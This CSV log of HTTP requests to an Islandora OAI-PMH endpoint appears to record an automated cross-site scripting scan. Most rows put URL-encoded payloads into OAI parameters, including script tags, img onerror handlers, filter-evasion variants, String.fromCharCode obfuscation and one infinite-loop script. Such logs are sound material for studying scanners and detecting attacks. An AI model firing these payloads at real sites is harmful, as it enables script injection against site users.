uuid,timestamp,http_status_code,request_url,response_time,http_version
89c515bb-5b3f-4e0d-b69d-d6ffd51b41fd,2025-01-01 16:38:00,200,http://islandora.io/oai/request?verb=ListSets,47.83 ms,HTTP/1.1
b1c54b86-242d-4f95-a570-88776a683b43,2025-01-01 16:38:01,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3C%21--%5Bif%5D%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript+--%3E&set=%3C%21--%5Bif%5D%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript+--%3E,66.67 ms,HTTP/1.1
6d79b79c-99f8-4aa0-817c-2d3d6b5a7a4b,2025-01-01 16:38:01,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3C%21--%5Bif%5D%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript+--%3E,65.35 ms,HTTP/1.1
7125fcd9-c2f0-4691-abc2-e3bbcc10a1e9,2025-01-01 16:38:01,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%21--%5Bif%5D%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript+--%3E&metadataPrefix=marc,67.52 ms,HTTP/1.1
bc2a2848-15cb-4856-8b8c-d564619e2613,2025-01-01 16:38:02,200,http://islandora.io/oai/request?verb=%3C%21--%5Cx3E%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,62.42 ms,HTTP/1.1
8e5fda04-b5a3-423c-b0de-cf70c3bb2b7a,2025-01-01 16:38:02,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%21--%5Cx3E%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,46.54 ms,HTTP/1.1
e6c4a294-c5f8-4dc6-91e9-ff2832bd4531,2025-01-01 16:38:02,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%21--%5Cx3E%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,90.15 ms,HTTP/1.1
8b463f69-ba0c-4cd0-bcbf-4474fa8a5505,2025-01-01 16:38:03,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3C%21--%5Cx3E%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,52.71 ms,HTTP/1.1
94158ca7-cc82-43b9-a25b-d9b4f73157e7,2025-01-01 16:38:03,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%21--%5Cx3E%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E&until=%3C%21--%5Cx3E%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E,53.19 ms,HTTP/1.1
53e50c7a-8b14-4b88-88d7-b5835fcd4cd7,2025-01-01 16:38:03,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%21--%5Cx3E%3Cimg+src%3Dxxx%3Ax+onerror%3Djavascript%3Aalert%281%29%3E+--%3E&metadataPrefix=oai_dc,60.43 ms,HTTP/1.1
5f26ec8e-0e10-412e-a6db-d54f89de0ee0,2025-01-01 16:38:04,200,http://islandora.io/oai/request?verb=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B%2F%2F--%3E%3C%2Fscript%3E,47.31 ms,HTTP/1.1
8016c115-bccb-48b3-ba32-0764624b0da7,2025-01-01 16:38:04,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B%2F%2F--%3E%3C%2Fscript%3E,68.99 ms,HTTP/1.1
e75bafec-849d-44e1-b4b7-afcb36469b02,2025-01-01 16:38:04,200,http://islandora.io/oai/request?verb=ListSets,52.44 ms,HTTP/1.1
6745e40d-ca67-4b86-8651-5dc177f32d0e,2025-01-01 16:38:05,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B%2F%2F--%3E%3C%2Fscript%3E&set=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B%2F%2F--%3E%3C%2Fscript%3E,66.11 ms,HTTP/1.1
5dc7b2cc-fd2f-444e-86c6-8e9c065fc901,2025-01-01 16:38:05,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B%2F%2F--%3E%3C%2Fscript%3E&set=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B%2F%2F--%3E%3C%2Fscript%3E,63.62 ms,HTTP/1.1
524588fd-bc79-4633-b54a-e3c3ca96feec,2025-01-01 16:38:06,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%21%5B%3C%21--%5D%5D%3Cscript%3Edocument.vulnerable%3Dtrue%3B%2F%2F--%3E%3C%2Fscript%3E&metadataPrefix=marc,63.09 ms,HTTP/1.1
5ff72ef9-3d5a-4f94-9a48-2e85e28e2106,2025-01-01 16:38:06,200,http://islandora.io/oai/request?verb=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Dalert%28XSS%29%2F%2F%22%3E,54.37 ms,HTTP/1.1
7dcf5590-782b-428f-b463-fbf7f6cf2c29,2025-01-01 16:38:06,200,http://islandora.io/oai/request?verb=ListMetadataFormats,44.81 ms,HTTP/1.1
b2f735b2-1337-45af-91dd-438f468859df,2025-01-01 16:38:07,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Dalert%28XSS%29%2F%2F%22%3E,71.14 ms,HTTP/1.1
bc5ea052-9c99-4cc9-8172-f0057585e3f5,2025-01-01 16:38:07,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Dalert%28XSS%29%2F%2F%22%3E,64.93 ms,HTTP/1.1
99838d68-773b-45c7-a92f-6a31671974f6,2025-01-01 16:38:07,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Dalert%28XSS%29%2F%2F%22%3E&until=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Dalert%28XSS%29%2F%2F%22%3E,52.08 ms,HTTP/1.1
b1d63f0b-5469-4aa5-a23e-e54c442da93a,2025-01-01 16:38:08,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Dalert%28XSS%29%2F%2F%22%3E&metadataPrefix=marc,63.42 ms,HTTP/1.1
72c8e3f4-0154-4fe7-9bb6-df362db110ee,2025-01-01 16:38:08,200,http://islandora.io/oai/request?verb=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E,67.17 ms,HTTP/1.1
a62a3ddf-06ea-47d5-a7ef-b1b1c80f38d9,2025-01-01 16:38:08,200,http://islandora.io/oai/request?verb=ListMetadataFormats,49.40 ms,HTTP/1.1
20467393-5c43-4141-b5ed-e2180ea4182e,2025-01-01 16:38:09,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E,54.88 ms,HTTP/1.1
09fe4c7e-607d-48e4-9031-ea012805b930,2025-01-01 16:38:09,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E&set=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E,90.78 ms,HTTP/1.1
c2cd59f0-7c53-49d1-b1e1-74722c955e10,2025-01-01 16:38:09,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E&set=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E,62.87 ms,HTTP/1.1
3dbea6e9-b8c5-4166-86ba-40cbbe441fe0,2025-01-01 16:38:10,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%21%5B%3E%3Cimg+src%3D%22%5D%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%281%29%2F%2F%22%3E&metadataPrefix=marc,48.95 ms,HTTP/1.1
025bf4be-5d45-4133-b149-87c47aa6b238,2025-01-01 16:38:10,200,http://islandora.io/oai/request?verb=%3C%21%5BCDATA%5B%3Cscript%3Evar+n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E,36.71 ms,HTTP/1.1
4e54aa7b-5071-4916-afec-bf818e971be9,2025-01-01 16:38:10,200,http://islandora.io/oai/request?verb=ListMetadataFormats,44.10 ms,HTTP/1.1
f0a8ea7a-7ac1-4bfe-804a-d58c6ab7fa46,2025-01-01 16:38:11,200,http://islandora.io/oai/request?verb=ListSets,56.10 ms,HTTP/1.1
8a568a6f-d838-42b7-a692-8874bdaf1aac,2025-01-01 16:38:11,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%21%5BCDATA%5B%3Cscript%3Evar+n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E&until=%3C%21%5BCDATA%5B%3Cscript%3Evar+n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E&set=%3C%21%5BCDATA%5B%3Cscript%3Evar+n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E,82.67 ms,HTTP/1.1
93d9dd1a-21c5-483c-9d5d-189551792948,2025-01-01 16:38:11,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=%3C%21%5BCDATA%5B%3Cscript%3Evar+n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E,32.88 ms,HTTP/1.1
febee623-0fba-4dfd-91e2-7925dfc72cae,2025-01-01 16:38:12,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%21%5BCDATA%5B%3Cscript%3Evar+n%3D0%3Bwhile%28true%29%7Bn%2B%2B%3B%7D%3C%2Fscript%3E%5D%5D%3E&metadataPrefix=marc,42.97 ms,HTTP/1.1
b9ffe085-d472-4037-9c06-9588fbc6ab97,2025-01-01 16:38:12,200,http://islandora.io/oai/request?verb=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E,73.21 ms,HTTP/1.1
c0478e99-1545-440a-9e10-33b399a09396,2025-01-01 16:38:12,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E,56.69 ms,HTTP/1.1
30db5607-7dcc-4daf-bc6c-e45458ef999f,2025-01-01 16:38:13,200,http://islandora.io/oai/request?verb=ListSets,30.72 ms,HTTP/1.1
2b0fd369-f050-4443-8d64-1d918e6cfe58,2025-01-01 16:38:13,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,42.53 ms,HTTP/1.1
5de196be-081e-4de8-9bde-a99e13fbb395,2025-01-01 16:38:13,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&set=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E,92.05 ms,HTTP/1.1
e9ef3e81-1855-4a9c-8e24-209d296d856e,2025-01-01 16:38:14,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%22%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&metadataPrefix=oai_dc,62.09 ms,HTTP/1.1
1a27748f-fcf0-4ebc-8410-809be935b0d0,2025-01-01 16:38:14,200,http://islandora.io/oai/request?verb=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%22%3E,57.66 ms,HTTP/1.1
10efa889-bec8-4f9f-896a-20d5dfd9bf1d,2025-01-01 16:38:14,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%22%3E,57.18 ms,HTTP/1.1
ef1d8721-1766-49fb-a319-9c61037d4ba0,2025-01-01 16:38:15,200,http://islandora.io/oai/request?verb=ListSets,52.70 ms,HTTP/1.1
52d2565e-d74e-4ebc-820d-e1030a0dd5d1,2025-01-01 16:38:15,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,68.85 ms,HTTP/1.1
f4c921b9-b5a2-4412-a908-282a97b32a47,2025-01-01 16:38:15,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%22%3E,55.25 ms,HTTP/1.1
d1ca603d-453f-4dc3-9ab6-ef12a186c0ab,2025-01-01 16:38:16,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%22%3E&metadataPrefix=oai_dc,70.57 ms,HTTP/1.1
5ceed8c0-9716-4f17-8fa5-0535d521aa04,2025-01-01 16:38:16,200,http://islandora.io/oai/request?verb=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,76.70 ms,HTTP/1.1
569ed294-2f5a-4461-b285-8f5c2f9887f1,2025-01-01 16:38:16,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.88 ms,HTTP/1.1
157f4615-1a09-4a7e-beec-334ad30e3e10,2025-01-01 16:38:17,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,52.37 ms,HTTP/1.1
84d528f7-53f1-4e13-8142-89d2f4252ff7,2025-01-01 16:38:17,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,62.55 ms,HTTP/1.1
1fcd7048-1c01-4bc9-bd57-9d5f303f3e01,2025-01-01 16:38:17,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc,111.76 ms,HTTP/1.1
3ba1faec-0015-45f9-914e-518a9f8dad59,2025-01-01 16:38:18,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%25+foo%3E%3Cx+foo%3D%22%25%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E&metadataPrefix=oai_dc,57.57 ms,HTTP/1.1
f925028d-5baf-4992-a88d-413a7ae47414,2025-01-01 16:38:18,200,http://islandora.io/oai/request?verb=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript+--%3E,51.39 ms,HTTP/1.1
7cf91d29-196b-46ed-a968-f22be6c60eae,2025-01-01 16:38:19,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript+--%3E,59.05 ms,HTTP/1.1
fc6788f1-bafe-44d2-9f8d-3814f5ffde96,2025-01-01 16:38:19,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript+--%3E,63.12 ms,HTTP/1.1
e445c2ef-3ca3-4175-8c5d-2cf110dd2668,2025-01-01 16:38:19,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript+--%3E,68.04 ms,HTTP/1.1
9671e88e-49b4-48e8-bfd2-ee70a3455e7e,2025-01-01 16:38:20,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript+--%3E,31.41 ms,HTTP/1.1
af629dbd-c864-4fe4-be51-e237ff4b96e3,2025-01-01 16:38:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%25%3C%21--%27%25%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript+--%3E&metadataPrefix=marc,59.87 ms,HTTP/1.1
821b0552-cd0b-41eb-961d-72ccd7826ae9,2025-01-01 16:38:20,200,http://islandora.io/oai/request?verb=%3C--%60%3Cimg%2Fsrc%3D%60+onerror%3Dalert%281%29%3E+--%21%3E,62.15 ms,HTTP/1.1
4597bcc2-7ebf-451b-9e58-192402a37a37,2025-01-01 16:38:21,200,http://islandora.io/oai/request?verb=ListMetadataFormats,54.55 ms,HTTP/1.1
280ce261-4050-4ade-8083-cb0475638441,2025-01-01 16:38:21,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C--%60%3Cimg%2Fsrc%3D%60+onerror%3Dalert%281%29%3E+--%21%3E,57.87 ms,HTTP/1.1
d2cb315b-59ae-4871-b873-85794548c6ac,2025-01-01 16:38:21,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C--%60%3Cimg%2Fsrc%3D%60+onerror%3Dalert%281%29%3E+--%21%3E&until=%3C--%60%3Cimg%2Fsrc%3D%60+onerror%3Dalert%281%29%3E+--%21%3E&set=%3C--%60%3Cimg%2Fsrc%3D%60+onerror%3Dalert%281%29%3E+--%21%3E,81.67 ms,HTTP/1.1
94450ee6-070a-46a3-bd80-75da15a74614,2025-01-01 16:38:22,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3C--%60%3Cimg%2Fsrc%3D%60+onerror%3Dalert%281%29%3E+--%21%3E,86.34 ms,HTTP/1.1
7fee7db9-3e2f-4ffe-bb82-d97fd4e51299,2025-01-01 16:38:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C--%60%3Cimg%2Fsrc%3D%60+onerror%3Dalert%281%29%3E+--%21%3E&metadataPrefix=marc,63.00 ms,HTTP/1.1
492410cc-2bc1-425d-bfac-4e4a9ee238fc,2025-01-01 16:38:22,200,http://islandora.io/oai/request?verb=%3C%2F+foo%3D%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E,52.02 ms,HTTP/1.1
d4d4805d-da35-424a-abd9-a4fd33294322,2025-01-01 16:38:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2F+foo%3D%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E,64.00 ms,HTTP/1.1
990814a6-6cd7-41c1-b6cd-2297e033d6cd,2025-01-01 16:38:23,200,http://islandora.io/oai/request?verb=ListSets,51.44 ms,HTTP/1.1
5ad51aa1-0975-497a-9a22-98cca9c10245,2025-01-01 16:38:23,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3C%2F+foo%3D%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E&set=%3C%2F+foo%3D%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E,66.37 ms,HTTP/1.1
5ec90ea5-367b-4f09-8b3a-e4350ce2fc33,2025-01-01 16:38:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc,50.45 ms,HTTP/1.1
5a2b7a29-03f1-4167-b4d8-1caf61db608a,2025-01-01 16:38:24,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2F+foo%3D%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E&metadataPrefix=marc,54.81 ms,HTTP/1.1
380b30ee-ccc7-4085-bb7e-92b1afe08e11,2025-01-01 16:38:24,200,http://islandora.io/oai/request?verb=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,60.89 ms,HTTP/1.1
8918e3c4-0670-433a-bd77-41d503ad6c63,2025-01-01 16:38:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,49.23 ms,HTTP/1.1
6d407a8d-4b53-4ffb-93db-5da810417072,2025-01-01 16:38:25,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,56.70 ms,HTTP/1.1
8d1b3c73-e0f2-47e0-9001-01f5360d0f4f,2025-01-01 16:38:25,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,71.99 ms,HTTP/1.1
a249914c-0258-4165-b7a8-6c158c05a4f3,2025-01-01 16:38:26,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E&until=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E,65.70 ms,HTTP/1.1
ac057c52-bc04-42bd-adec-a07b08c2c892,2025-01-01 16:38:26,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2F+foo%3D%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E%22%3E&metadataPrefix=oai_dc,63.99 ms,HTTP/1.1
44f47a37-81f1-43f8-845c-79f0e1041be5,2025-01-01 16:38:26,200,http://islandora.io/oai/request?verb=%3C%2F%2F+style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E,55.55 ms,HTTP/1.1
1a6bc18d-b12f-487a-9a6d-bddb7be977f8,2025-01-01 16:38:27,200,http://islandora.io/oai/request?verb=ListMetadataFormats,46.09 ms,HTTP/1.1
90045dea-fec9-4979-930a-7cb7c6133577,2025-01-01 16:38:27,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=%3C%2F%2F+style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E,64.53 ms,HTTP/1.1
f90f6ce4-6328-4c5e-8bc8-a26526decda4,2025-01-01 16:38:27,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3C%2F%2F+style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E,61.98 ms,HTTP/1.1
eee2a487-6c02-4582-bfbc-638acb86de5e,2025-01-01 16:38:28,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3C%2F%2F+style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E,43.63 ms,HTTP/1.1
7da194ed-901d-4d4d-899d-be7651430c98,2025-01-01 16:38:28,200,http://islandora.io/oai/request?verb=GetRecord&identifier=%3C%2F%2F+style%3Dx%3Aexpression%5C28javascript%3Aalert%281%29%5C29%3E&metadataPrefix=marc,95.08 ms,HTTP/1.1
a523340d-c685-4138-aa18-4fd5e22893e6,2025-01-01 16:38:28,200,http://islandora.io/oai/request?verb=%3C%2F%2F%2Fstyle%2F%2F%2F%3E%3Cspan+%252F+onmousemove%3D%27alert%26lpar%3B1%26rpar%3B%27%3ESPAN,72.85 ms,HTTP/1.1
12acb1a4-c26e-4d6e-9e6a-abe7d039dcc6,2025-01-01 16:38:29,200,http://islandora.io/oai/request?verb=ListMetadataFormats,51.65 ms,HTTP/1.1
f01c42d6-ee68-4a05-9f83-46aafb574ba9,2025-01-01 16:38:29,200,http://islandora.io/oai/request?verb=ListSets,41.80 ms,HTTP/1.1
f307ec11-4fc1-4eda-8d67-61e1ac555654,2025-01-01 16:38:29,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,75.30 ms,HTTP/1.1
6e33b687-2adf-479e-9007-4c00ed9bd7a0,2025-01-01 16:38:30,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3C%2F%2F%2Fstyle%2F%2F%2F%3E%3Cspan+%252F+onmousemove%3D%27alert%26lpar%3B1%26rpar%3B%27%3ESPAN,94.75 ms,HTTP/1.1
